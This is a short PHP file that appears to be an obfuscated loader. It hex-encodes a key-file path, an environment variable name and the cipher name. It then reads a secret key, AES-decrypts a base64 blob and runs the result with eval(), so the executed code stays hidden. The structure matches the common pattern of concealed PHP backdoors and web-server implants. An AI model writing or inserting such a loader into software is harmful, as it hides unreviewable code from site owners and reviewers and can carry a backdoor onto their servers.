<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('rWthCDiiJ8Sc6zjMPAUHGw==');

$c=base64_decode(

'QsivQw8h3ZCTkIp+TQFo697QltBfiHsoiiGIziUJJA3I0m7UKonDwHj1QzW2IjcBKJn/euTUki7o' .
'7Ynt7ol4X/iW0fSOo3M4wS/AXt12JCY0h/Uz8wwZDJB6iibdqGBPg+aeayU8bfe6EbVf4hjXcob8' .
'Egi27qK0BAIhFu7OczbMPyL9M4z2jmfuUt+CVMW9Ih9WW0Y9zl4mhczNqv7cutowwA6ivUo9Ww+5' .
'lKBtDaZBELxJW9F8DOYp6o0zgEKRfR58atSJdaOiI1i0srkSmS/flTGawJUSptQCaUP77ICbfzxU' .
'GGNMlC1WkIXt/i7uuSXG8hfv49xj+1hbvorN4wGMyNc2agKCurX1OXUg/12BW4EwMaTdhf0+IKpS' .
'GAXhMyEL3W1meWj4rZCtOjesDgY//J31VBUZnpHFp4T/nLNWMy2Fuv7rF7sIlMvVeyZx+7eEHe0h' .
'Xq15V7R0sDEYiw8EzKl7pOUHw/bM6voyy+uSB2GYdfiWrYO+SZqcrMYh8opud5p5wHax2HnDK3V6' .
'ZVBhIgFWsyeoUA8rGg1YaRc='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

